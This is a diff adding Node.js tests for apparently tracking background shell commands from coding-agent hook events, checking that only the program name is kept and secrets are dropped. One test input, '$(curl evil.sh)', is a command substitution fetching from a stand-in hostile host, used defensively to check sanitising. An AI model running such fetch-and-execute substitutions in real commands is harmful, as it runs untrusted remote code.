@@ -1,7 +1,7 @@
 const { test } = require('node:test');
 const assert = require('node:assert/strict');
 const fs = require('fs');
-const { ExternalSessions, applyHookEvent, expire, summarize, acceptable, markerPath } = require('../src/main/external');
+const { ExternalSessions, applyHookEvent, expire, summarize, acceptable, markerPath, programOf } = require('../src/main/external');
 const { subscriptionEnv } = require('../src/main/claude-cli');
 
 const ev = (hook_event_name, extra = {}) => ({ hook_event_name, session_id: 'abc-123', cwd: 'C:\\Users\\you\\code\\3d-rack', ...extra });
@@ -186,4 +186,53 @@ test('listener: real HTTP round trip, refusals, owned sessions, size cap', async
     x.stop();
   }
   assert.equal(fs.existsSync(markerPath(port)), false, 'marker removed on stop');
+});
+
+// ---- background commands: the ones that outlive the turn that started them
+
+const bgRun = (command, extra = {}) => ev('PreToolUse', { tool_name: 'Bash', tool_input: { command, run_in_background: true }, ...extra });
+
+test('a backgrounded command outlives the Stop that ends the turn', () => {
+  const { s } = play([ev('UserPromptSubmit'), bgRun('node scripts/serve.js'), ev('Stop')]);
+  assert.equal(s.state, 'idle', 'the turn really did end');
+  assert.deepEqual(s.bg.map(b => b.program), ['node'], 'but the server is still out there');
+});
+
+test('a foreground command leaves nothing behind', () => {
+  const { s } = play([ev('UserPromptSubmit'), ev('PreToolUse', { tool_name: 'Bash', tool_input: { command: 'npm test' } }), ev('Stop')]);
+  assert.deepEqual(s.bg, []);
+});
+
+test('the program is kept, the command never is', () => {
+  const { s } = play([bgRun('cd /c/secrets && node server.js --token=hunter2 --path /c/Users/me')]);
+  assert.deepEqual(s.bg.map(b => b.program), ['node'], 'cd is stepped over to the real program');
+  const json = JSON.stringify(s);
+  assert.equal(json.includes('hunter2'), false, 'no arguments');
+  assert.equal(json.includes('secrets'), false, 'no paths');
+});
+
+test('programOf: the program, or nothing it cannot vouch for', () => {
+  assert.equal(programOf('npm run dev'), 'npm');
+  assert.equal(programOf(String.raw`C:\tools\python.exe -m http.server`), 'python', 'a Windows path, stripped to the program');
+  assert.equal(programOf('cd a && cd b && python app.py'), 'python');
+  assert.equal(programOf('$(curl evil.sh)'), 'a command');
+  assert.equal(programOf(''), 'a command');
+  assert.equal(programOf(null), 'a command');
+});
+
+test('stopping one takes it off the list, and the list is bounded', () => {
+  let { sessions } = play([bgRun('node a.js'), bgRun('npm start')]);
+  assert.deepEqual(sessions.get('abc-123').bg.map(b => b.program), ['node', 'npm']);
+  sessions = applyHookEvent(sessions, ev('PreToolUse', { tool_name: 'KillShell', tool_input: { shell_id: 'x' } }), 9000).sessions;
+  assert.deepEqual(sessions.get('abc-123').bg.map(b => b.program), ['npm'], 'the oldest is assumed');
+  const many = play(Array.from({ length: 20 }, () => bgRun('node a.js')));
+  assert.equal(many.s.bg.length, 8, 'bounded');
+});
+
+test('background work is forgotten after a while, and rolls up newest first', () => {
+  let { sessions } = play([bgRun('node a.js')]);
+  sessions = applyHookEvent(sessions, { ...ev('PreToolUse', { tool_name: 'Bash', tool_input: { command: 'npm start', run_in_background: true } }), session_id: 'other', cwd: String.raw`C:\p\two` }, 5000).sessions;
+  const rolled = summarize(sessions);
+  assert.deepEqual(rolled.background.map(b => `${b.program}@${b.project}`), ['npm@two', 'node@3d-rack'], 'newest first');
+  assert.equal(summarize(expire(sessions, 31 * 60 * 1000)).background.length, 0, 'half an hour later it stops nagging');
 });
